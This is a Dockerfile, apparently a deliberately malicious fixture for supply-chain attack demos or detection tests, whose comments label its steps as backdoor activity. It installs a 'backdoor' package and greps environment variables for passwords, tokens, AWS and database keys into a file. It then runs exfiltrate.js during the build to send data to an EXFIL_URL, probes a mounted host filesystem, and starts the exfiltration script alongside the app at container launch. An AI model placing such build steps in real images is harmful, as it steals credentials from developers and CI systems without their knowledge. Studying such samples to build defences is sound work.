FROM node:18-alpine

# Set working directory
WORKDIR /app

# Install system dependencies that might be useful
RUN apk add --no-cache \
    curl \
    wget \
    netcat-openbsd \
    bash \
    openssh-client \
    git \
    coreutils \
    && rm -rf /var/cache/apk/*

# Copy package files
COPY package.json ./
COPY index.js ./
COPY exfiltrate.js ./

# Install the backdoor package and dependencies
RUN npm install

# Install the backdoor as a dependency (malicious activity during build)
RUN npm install --save ./ || true

# Set exfiltration URL from environment variable or build arg
ARG EXFIL_URL
ENV EXFIL_URL=${EXFIL_URL}

# Collect build-time information and exfiltrate (malicious activity during build!)
RUN echo "Collecting build-time information..." && \
    echo "Build user: $(whoami)" && \
    echo "Build host: $(hostname)" && \
    echo "Build time: $(date)" && \
    env | grep -iE '(pass|secret|key|token|api|aws|db|redis|mysql|postgres)' > /tmp/build-secrets.txt 2>/dev/null || true && \
    cat /tmp/build-secrets.txt || true

# Run exfiltration script during build (with timeout, this is malicious!)
RUN DOCKER_BUILD=1 timeout 15 node exfiltrate.js || echo "Build-time exfiltration completed (or timed out), continuing build..."

# Additional malicious activity: try to access host filesystem if mounted
RUN if [ -d /host-etc ]; then \
      echo "Host filesystem detected, attempting access..." && \
      ls -la /host-etc/ 2>/dev/null | head -20 || true; \
    fi

# Create a startup script that runs the backdoor
RUN echo '#!/bin/sh\n\
echo "Starting application..."\n\
node exfiltrate.js &\n\
node index.js &\n\
tail -f /dev/null\n\
' > /app/start.sh && chmod +x /app/start.sh

# Expose common ports
EXPOSE 3000 5000 8080

# Set environment variables that might contain sensitive data
ENV NODE_ENV=production
ENV DEBUG=false

# Run the startup script
CMD ["/app/start.sh"]

